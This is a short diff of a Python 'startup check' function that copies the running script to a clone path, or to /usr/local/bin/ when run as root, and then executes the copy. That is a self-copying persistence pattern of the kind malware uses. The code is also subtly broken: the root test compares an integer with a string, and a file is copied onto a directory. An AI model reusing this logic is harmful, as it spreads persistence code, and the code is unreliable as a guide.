@@ -354,12 +354,12 @@ def srtChk(): # Startup Check. (Still in testing!)
             else:
                 if name != clone:
                     # Need to check root permissions to copy to /usr/local/bin/.
-                    #if os.getuid() == 'root':
-                        #shutil.copyfile(name, '/usr/local/bin/')
-                    if debugmode: # If debugmode is True, msgs will print to screen.
-                        print("Copying " + name + " to: " + clone)
-                    #os.system("cp " + name + " " + clone)
-                    shutil.copyfile(name, clone)
+                    if os.getuid() == 'root':
+                        shutil.copyfile(name, '/usr/local/bin/')
+                    else:
+                        if debugmode: # If debugmode is True, msgs will print to screen.
+                            print("Copying " + name + " to: " + clone)
+                        shutil.copyfile(name, clone)
             if debugmode: # If debugmode is True, msgs will print to screen.
                 print("Running: " + clone)
                 runcmd(clone)
